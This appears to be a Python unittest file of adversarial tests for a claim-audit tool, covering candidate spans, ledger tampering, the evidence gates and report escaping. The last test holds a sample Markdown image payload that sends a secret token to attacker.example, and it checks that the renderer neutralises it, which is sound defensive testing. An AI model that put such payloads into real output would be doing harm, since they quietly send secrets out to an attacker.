from __future__ import annotations

import copy
import hashlib
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from test_claim_audit import (
    RUNTIME_PATH,
    attach_source_and_evidence,
    base_claim,
    base_ledger,
    load_runtime,
    refresh_countercheck,
    valid_receipt,
)


def error_codes(gate: dict) -> set[str]:
    return {item.get("code") for item in gate.get("errors", [])}


class InputCoverageAdversarialTests(unittest.TestCase):
    def test_not_triggered_scope_cannot_render_an_audit_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            input_path = root / "input.txt"
            input_path.write_text("Alice is the current CEO.", encoding="utf-8")
            workspace = root / "audit"
            initialized = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "init",
                    "--input",
                    str(input_path),
                    "--workspace",
                    str(workspace),
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(initialized.returncode, 0, initialized.stderr)
            scoped = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "scope",
                    "--workspace",
                    str(workspace),
                    "--not-triggered",
                    "--reason",
                    "caller says this is not factual",
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(scoped.returncode, 0, scoped.stderr)

            finished = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "finish",
                    "--workspace",
                    str(workspace),
                ],
                capture_output=True,
                text=True,
                check=False,
            )

            self.assertNotEqual(finished.returncode, 0)
            self.assertFalse((workspace / "report.md").exists())

    def test_partial_declared_span_does_not_suppress_uncovered_remainder(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            declared = "Model A is cheapest"
            remainder = "and Model B is safest."
            input_path = root / "input.txt"
            input_path.write_text(f"{declared} {remainder}", encoding="utf-8")
            workspace = root / "audit"

            result = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "start",
                    "--input",
                    str(input_path),
                    "--workspace",
                    str(workspace),
                    "--reason",
                    "two comparison claims",
                    "--candidate",
                    declared,
                ],
                capture_output=True,
                text=True,
                check=False,
            )

            self.assertEqual(result.returncode, 0, result.stderr)
            ledger = json.loads((workspace / "ledger.json").read_text(encoding="utf-8"))
            auto_gaps = [
                item["text"]
                for item in ledger["scope"]["candidate_inventory"]
                if item.get("origin") == "auto_gap"
            ]
            self.assertIn(remainder, auto_gaps)
            self.assertIn(remainder, ledger["scope"]["unreviewed_claims"])

    def test_ambiguous_declared_candidate_requires_unique_context(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repeated = "It works."
            input_path = root / "input.txt"
            input_path.write_text(
                f"Product A says: {repeated} Product B says: {repeated}",
                encoding="utf-8",
            )
            workspace = root / "audit"

            result = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "start",
                    "--input",
                    str(input_path),
                    "--workspace",
                    str(workspace),
                    "--reason",
                    "ambiguous capability statement",
                    "--candidate",
                    repeated,
                ],
                capture_output=True,
                text=True,
                check=False,
            )

            self.assertNotEqual(result.returncode, 0)
            self.assertIn("unique", result.stderr.lower())
            self.assertFalse(workspace.exists())

    def test_start_rejects_overlapping_declared_candidates_before_publish(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            whole = "Model A is the current CEO."
            nested = "the current CEO"
            input_path = root / "input.txt"
            input_path.write_text(whole, encoding="utf-8")
            workspace = root / "audit"

            result = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "start",
                    "--input",
                    str(input_path),
                    "--workspace",
                    str(workspace),
                    "--reason",
                    "overlapping candidate declarations",
                    "--candidate",
                    whole,
                    "--candidate",
                    nested,
                ],
                capture_output=True,
                text=True,
                check=False,
            )

            self.assertNotEqual(result.returncode, 0)
            self.assertIn("overlap", result.stderr.lower())
            self.assertFalse(workspace.exists())

    def test_start_rejects_repeated_auto_gap_text_without_unique_context(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            first = "Product A exists."
            second = "Product B exists."
            input_path = root / "input.txt"
            input_path.write_text(
                f"{first} It works. {second} It works.", encoding="utf-8"
            )
            workspace = root / "audit"

            result = subprocess.run(
                [
                    sys.executable,
                    str(RUNTIME_PATH),
                    "start",
                    "--input",
                    str(input_path),
                    "--workspace",
                    str(workspace),
                    "--reason",
                    "two context-dependent repeated claims",
                    "--candidate",
                    first,
                    "--candidate",
                    second,
                ],
                capture_output=True,
                text=True,
                check=False,
            )

            self.assertNotEqual(result.returncode, 0)
            self.assertIn("larger unique contextual clause", result.stderr.lower())
            self.assertFalse(workspace.exists())

    def test_claim_text_cannot_substitute_unrelated_candidate(self):
        runtime = load_runtime()
        ledger = base_ledger()
        ledger["scope"]["candidate_inventory"][0].update(
            text="test input",
            sha256=hashlib.sha256(b"test input").hexdigest(),
            spans=[{"start": 0, "end": 10}],
        )
        claim = base_claim()
        claim["input_candidates"] = ["test input"]
        ledger["claims"] = [claim]

        gate = runtime.validate_bundle(ledger, {})

        self.assertIn("CLAIM_TEXT_NOT_BOUND_TO_CANDIDATE", error_codes(gate))

    def test_gate_rejects_a_declared_candidate_with_multiple_spans(self):
        runtime = load_runtime()
        ledger = base_ledger()
        claim = base_claim()
        ledger["claims"] = [claim]
        binding = ledger["scope"]["candidate_inventory"][0]
        binding["spans"].append(copy.deepcopy(binding["spans"][0]))

        gate = runtime.validate_bundle(ledger, {})

        self.assertIn(
            "DECLARED_CANDIDATE_SPAN_COUNT_INVALID", error_codes(gate)
        )

    def test_gate_rejects_directly_injected_exclusion_of_declared_candidate(self):
        runtime = load_runtime()
        ledger = base_ledger()
        claim = base_claim()
        ledger["claims"] = [claim]
        declared = ledger["scope"]["candidate_inventory"][0]["text"]
        ledger["scope"]["excluded_candidates"] = [
            {
                "candidate": declared,
                "classification": "opinion",
                "reason": "Direct ledger mutation tried to bypass the CLI boundary.",
                "excluded_at": "2026-08-06T00:00:00Z",
            }
        ]

        gate = runtime.validate_bundle(ledger, {})

        self.assertIn("EXCLUSION_ORIGIN_FORBIDDEN", error_codes(gate))

    def test_gate_rejects_duplicate_candidate_ids_after_direct_mutation(self):
        runtime = load_runtime()
        ledger = base_ledger()
        claim = base_claim()
        ledger["claims"] = [claim]
        first = ledger["scope"]["candidate_inventory"][0]
        second_text = "A second frozen unit."
        second_start = first["spans"][0]["end"] + 1
        ledger["scope"]["candidate_inventory"].append(
            {
                "candidate_id": first["candidate_id"],
                "text": second_text,
                "origin": "auto_gap",
                "sha256": hashlib.sha256(second_text.encode("utf-8")).hexdigest(),
                "spans": [
                    {"start": second_start, "end": second_start + len(second_text)}
                ],
            }
        )
        ledger["scope"]["unreviewed_claims"] = [second_text]

        gate = runtime.validate_bundle(ledger, {})

        self.assertIn("DUPLICATE_CANDIDATE_ID", error_codes(gate))

    def test_gate_rejects_candidate_span_length_mismatch(self):
        runtime = load_runtime()
        ledger = base_ledger()
        claim = base_claim()
        ledger["claims"] = [claim]
        ledger["scope"]["candidate_inventory"][0]["spans"][0]["end"] -= 1

        gate = runtime.validate_bundle(ledger, {})

        self.assertIn("CANDIDATE_SPAN_LENGTH_MISMATCH", error_codes(gate))


class SemanticIsolationAdversarialTests(unittest.TestCase):
    def setUp(self) -> None:
        self.runtime = load_runtime()

    def test_decisive_evidence_requires_nonempty_support_scope(self):
        ledger = base_ledger()
        claim = base_claim()
        receipts = attach_source_and_evidence(self.runtime, ledger, claim)
        claim["evidence"][0]["support_scope"] = ""
        claim.update(
            status="confirmed",
            source_identity_gate="pass",
            content_support_gate="pass",
        )
        refresh_countercheck(claim, ["S1"])
        ledger["claims"] = [claim]

        gate = self.runtime.validate_bundle(ledger, receipts)

        self.assertIn("EVIDENCE_SUPPORT_SCOPE_REQUIRED", error_codes(gate))

    def test_causal_refutation_requires_eligible_design_evidence(self):
        ledger = base_ledger()
        claim = base_claim()
        receipts = attach_source_and_evidence(self.runtime, ledger, claim)
        claim.update(
            claim_type="causal",
            causal_basis="cross_sectional_self_report",
            status="refuted",
            source_identity_gate="pass",
            content_support_gate="fail",
            conflicts=["The association does not establish the proposed causal effect."],
        )
        claim["evidence"][0].update(
            support="conflict",
            evidence_purpose="substantive",
        )
        identity = copy.deepcopy(claim["evidence"][0])
        identity.update(support="direct", evidence_purpose="source_identity")
        claim["evidence"].append(identity)
        ledger["claims"] = [claim]

        gate = self.runtime.validate_bundle(ledger, receipts)

        self.assertTrue(
            {"CAUSALITY_NOT_ESTABLISHED", "CAUSAL_DESIGN_EVIDENCE_REQUIRED"}
            & error_codes(gate)
        )

    def test_causal_positive_control_keeps_purposes_separate(self):
        ledger = base_ledger()
        claim = base_claim()
        receipts = attach_source_and_evidence(self.runtime, ledger, claim)
        substantive = claim["evidence"][0]
        substantive.update(
            evidence_purpose="substantive",
            excerpt="The named paper exists.",
            support_scope="the measured effect in the randomized study sample",
        )
        identity = copy.deepcopy(substantive)
        identity.update(
            evidence_purpose="source_identity",
            support_scope="the paper title and publisher record",
        )
        design = copy.deepcopy(substantive)
        design.update(
            evidence_purpose="study_design",
            support_scope="random assignment in the study methods",
        )
        claim["evidence"] = [substantive, identity, design]
        claim.update(
            claim_type="causal",
            causal_basis="randomized_controlled_trial",
            status="confirmed",
            source_identity_gate="pass",
            content_support_gate="pass",
        )
        refresh_countercheck(claim, ["S1"])
        ledger["claims"] = [claim]

        gate = self.runtime.validate_bundle(ledger, receipts)

        self.assertEqual(gate["verdict"], "PASS", gate["errors"])

    def test_arbitrary_origin_labels_do_not_establish_independence(self):
        ledger = base_ledger()
        claim = base_claim()
        receipts = attach_source_and_evidence(self.runtime, ledger, claim)
        ledger["sources"][0]["origin_id"] = "publisher:alpha"
        receipts["S1"]["origin_id"] = "publisher:alpha"
        receipts["S1"]["receipt_sha256"] = self.runtime.compute_receipt_sha256(
            receipts["S1"]
        )

        receipt2 = valid_receipt(self.runtime, source_id="S2", origin="publisher:beta")
        receipt2.update(
            requested_url="https://second.example.net/source",
            final_url="https://second.example.net/source",
            content_sha256="d" * 64,
        )
        receipt2["receipt_sha256"] = self.runtime.compute_receipt_sha256(receipt2)
        receipts["S2"] = receipt2
        ledger["sources"].append(
            {
                "source_id": "S2",
                "receipt": "receipts/S2.json",
                "source_tier": "A1",
                "evidence_role": "independent_replication",
                "publication_date": "2025-01-02",
                "freshness_status": "current",
                "freshness_rationale": "Opened during this audit.",
                "origin_id": "publisher:beta",
            }
        )
        second = copy.deepcopy(claim["evidence"][0])
        second["source_id"] = "S2"
        claim["evidence"].append(second)
        for source_id in ("S1", "S2"):
            identity = copy.deepcopy(claim["evidence"][0])
            identity.update(source_id=source_id, evidence_purpose="source_identity")
            claim["evidence"].append(identity)
        claim.update(
            requires_independent_evidence=True,
            status="confirmed",
            source_identity_gate="pass",
            content_support_gate="pass",
        )
        ledger["claims"] = [claim]

        gate = self.runtime.validate_bundle(ledger, receipts)

        self.assertIn("INDEPENDENT_ORIGIN_UNVERIFIED", error_codes(gate))


class ReportSafetyTests(unittest.TestCase):
    def test_render_escapes_untrusted_markdown_images_and_obsidian_embeds(self):
        runtime = load_runtime()
        payload = "![leak](https://attacker.example/pixel?secret=TOKEN) ![[private-note]]"

        escaped = runtime._md(payload)

        self.assertNotIn("![", escaped)
        self.assertNotIn("](", escaped)
        self.assertNotIn("![[", escaped)


if __name__ == "__main__":
    unittest.main()
